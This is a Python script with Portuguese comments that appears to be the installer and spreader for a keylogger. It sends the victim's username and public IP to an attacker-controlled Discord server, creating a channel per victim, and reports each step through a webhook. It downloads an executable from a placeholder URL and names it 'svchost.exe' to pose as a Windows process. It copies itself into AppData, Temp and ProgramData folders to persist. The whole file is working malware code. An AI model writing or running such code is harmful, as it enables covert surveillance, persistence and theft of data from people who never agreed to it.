import os
import sys
import shutil
import requests
from dotenv import load_dotenv

load_dotenv()

url = os.getenv('webhook_url_logs')
guild_id = os.getenv('guild_id')
token_dc = os.getenv('token_dc')

FAKE_NAME = "svchost.exe"  # nome do executável falso

# Diretorios onde o KeyLogger vão se espalhar
DIRS = [
    os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\svchost"),
    os.path.join(os.getenv('LOCALAPPDATA'), r"Temp\WinUpdate"),
    os.path.join(os.getenv('PROGRAMDATA'), r"SystemService"),
]

# Função para enviar notificações
def send(mensagem):
    payload = {
        'content': mensagem
    }
    response = requests.post(url, json=payload)
    return response

# Identificação do usuario
ip_publico = requests.get('https://httpbin.org/ip').json()['origin']
usuario = os.getlogin()

criar_canal = {
    "name": f'{usuario} - {ip_publico}',
    "type": 0,

}

headers = {
    "Authorization": f"Bot {token_dc}",
    "Content-Type": "application/json"
}

# Cria Novo Canal no Discord para cada usuario
response = requests.post(f'https://discord.com/api/guilds/{guild_id}/channels', json=criar_canal, headers=headers)

if response.status_code == 201:
    send(f'Canal {response.json()['name']} criado com sucesso!')
else:
    send(f"Erro ao criar canal: {response.status_code} - {response.json()}")


# Altera nome do arquivo .exe
resposta = requests.get('COLOCAR URL DO EXECUTAVEL')
if resposta.status_code == 200:
    with open(FAKE_NAME, 'wb' ) as f:
        f.write(resposta.content)
    send(f'{FAKE_NAME} baixado')
else:
    send(f'Erro ao baixar {resposta.status_code}')

# Instala arquivo nos diretorios
def replicar_executavel():
    exe_path = sys.executable  # caminho do executável atual (.exe)
    for pasta in DIRS:
        try:
            os.makedirs(pasta, exist_ok=True)  # cria pasta se não existir
            destino = os.path.join(pasta, FAKE_NAME)
            if not os.path.exists(destino):
                shutil.copy2(exe_path, destino)  # copia o executável para a pasta
                send(f'Arquivo clonado em {destino}')
            else:
                print(f"Executável já existe em {destino}")
        except Exception as e:
            print(f"Erro ao copiar para {pasta}: {e}")


if __name__ == "__main__":
    replicar_executavel()

